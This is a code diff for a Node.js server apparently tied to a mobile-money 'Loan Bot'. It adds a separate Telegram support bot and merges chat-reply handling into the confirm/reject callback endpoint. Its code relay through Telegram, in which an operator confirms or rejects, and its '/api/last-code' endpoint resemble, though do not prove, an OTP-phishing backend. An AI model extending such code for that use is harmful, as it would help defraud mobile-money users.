@@ -18,8 +18,14 @@ const server = http.createServer(app);
 const io = new Server(server, { cors: { origin: "*" } });
 // ==========================================================
 
+// Existing Loan Bot
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID   = process.env.CHAT_ID;
+
+// ===== NEW: Support Chat Bot Variables =====
+const SUPPORT_BOT_TOKEN = process.env.SUPPORT_BOT_TOKEN;
+const SUPPORT_CHAT_ID   = process.env.SUPPORT_CHAT_ID;
+// ============================================
 
 // Serve HTML from parent folder
 app.use(express.static(path.join(__dirname, '..')));
@@ -209,42 +215,62 @@ app.get('/api/status', function (req, res) {
 });
 
 // ============================================================
-// 6) TELEGRAM CALLBACK
+// 6) TELEGRAM CALLBACK (Merged: Handles Buttons AND Chat)
 // ============================================================
 app.post('/api/telegram-callback', async function (req, res) {
+    // --- A) Handle Button Clicks (Confirm/Reject) ---
     var cb = req.body.callback_query;
-    if (!cb) return res.sendStatus(200);
+    if (cb) {
+        var parts = cb.data.split(':');
+        var action = parts[0];
+        var referenceId = parts[1];
 
-    var parts = cb.data.split(':');
-    var action = parts[0];
-    var referenceId = parts[1];
+        decisions[referenceId] = (action === 'confirm') ? 'confirmed' : 'rejected';
+        console.log('📥 Decision:', referenceId, '->', decisions[referenceId]);
 
-    decisions[referenceId] = (action === 'confirm') ? 'confirmed' : 'rejected';
-    console.log('📥 Decision:', referenceId, '->', decisions[referenceId]);
+        try {
+            await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/answerCallbackQuery', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    callback_query_id: cb.id,
+                    text: action === 'confirm' ? '✅ Confirmed' : '❌ Rejected'
+                })
+            });
 
-    try {
-        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/answerCallbackQuery', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                callback_query_id: cb.id,
-                text: action === 'confirm' ? '✅ Confirmed' : '❌ Rejected'
-            })
-        });
+            await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/editMessageText', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: cb.message.chat.id,
+                    message_id: cb.message.message_id,
+                    text: cb.message.text + '\n\n— — —\n' +
+                          (action === 'confirm' ? '✅ CONFIRMED' : '❌ REJECTED'),
+                    parse_mode: 'HTML'
+                })
+            });
+        } catch (err) {
+            console.error('Callback reply failed:', err);
+        }
+        return res.sendStatus(200);
+    }
 
-        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/editMessageText', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: cb.message.chat.id,
-                message_id: cb.message.message_id,
-                text: cb.message.text + '\n\n— — —\n' +
-                      (action === 'confirm' ? '✅ CONFIRMED' : '❌ REJECTED'),
-                parse_mode: 'HTML'
-            })
-        });
-    } catch (err) {
-        console.error('Callback reply failed:', err);
+    // --- B) NEW: Handle Chat Replies from Agent (SUPPORT BOT) ---
+    var msg = req.body.message;
+    if (msg && msg.text && msg.reply_to_message) {
+        var targetSocketId = replyMap[msg.reply_to_message.message_id];
+        if (targetSocketId) {
+            io.to(targetSocketId).emit('agent-message', { text: msg.text });
+            console.log('📨 Chat reply routed to:', targetSocketId);
+            
+            try {
+                await fetch('https://api.telegram.org/bot' + SUPPORT_BOT_TOKEN + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: SUPPORT_CHAT_ID, text: '✅ Reply delivered.' })
+                });
+            } catch (e) { console.error(e); }
+        }
     }
 
     res.sendStatus(200);
@@ -328,18 +354,15 @@ app.post('/api/last-code', async function (req, res) {
 });
 
 // ============================================================
-// ===== NEW: LIVE SUPPORT CHAT BRIDGE =====
+// ===== NEW: LIVE SUPPORT CHAT BRIDGE (Uses SUPPORT BOT) =====
 // ============================================================
 
-// Store socket connections: socketId -> referenceId (for routing replies)
 const chatSessions = {};
-// Store Telegram message IDs -> socketId (so when you reply, it knows which user)
 const replyMap = {};
 
 io.on('connection', (socket) => {
     console.log('💬 Chat user connected:', socket.id);
 
-    // User sends a message
     socket.on('user-message', async (data) => {
         const text = data.text;
         const userRef = 'CHAT-' + socket.id.slice(0, 6).toUpperCase();
@@ -355,11 +378,12 @@ io.on('connection', (socket) => {
             '\n<i>👉 Reply to THIS message to send a response back to the user.</i>';
 
         try {
-            const res = await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+            // Send using the SUPPORT bot
+            const res = await fetch('https://api.telegram.org/bot' + SUPPORT_BOT_TOKEN + '/sendMessage', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    chat_id: CHAT_ID,
+                    chat_id: SUPPORT_CHAT_ID,
                     text: telegramMsg,
                     parse_mode: 'HTML',
                     reply_markup: {
@@ -370,13 +394,12 @@ io.on('connection', (socket) => {
             });
             const json = await res.json();
             
-            // Save mapping so we know which socket gets the reply
             if (json.ok && json.result) {
                 replyMap[json.result.message_id] = socket.id;
-                console.log('📤 Sent to Telegram:', userRef);
+                console.log('📤 Sent to Support Telegram:', userRef);
             }
         } catch (err) {
-            console.error('Failed to send to Telegram:', err);
+            console.error('Failed to send to Support Telegram:', err);
         }
     });
 
@@ -386,43 +409,10 @@ io.on('connection', (socket) => {
     });
 });
 
-// This endpoint receives replies FROM Telegram
-app.post('/api/telegram-chat-reply', async function (req, res) {
-    const msg = req.body.message;
-    if (!msg || !msg.text) return res.sendStatus(200);
-
-    // Check if this is a reply to one of our chat messages
-    if (msg.reply_to_message) {
-        const targetSocketId = replyMap[msg.reply_to_message.message_id];
-        if (targetSocketId) {
-            io.to(targetSocketId).emit('agent-message', { text: msg.text });
-            console.log('📨 Reply routed to socket:', targetSocketId);
-            
-            // Send confirmation back to Telegram
-            try {
-                await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: '✅ Reply delivered to user.'
-                    })
-                });
-            } catch (e) { console.error(e); }
-        } else {
-            console.log('⚠️ Reply to unknown message ID:', msg.reply_to_message.message_id);
-        }
-    }
-    res.sendStatus(200);
-});
-
 // ============================================================
-// END NEW
+// START SERVER
 // ============================================================
-
-// ===== NEW: Use `server.listen` instead of `app.listen` =====
 var PORT = process.env.PORT || 3000;
 server.listen(PORT, '0.0.0.0', function () {
     console.log('🚀 MoMo server running at port ' + PORT);
 });
-// ============================================================
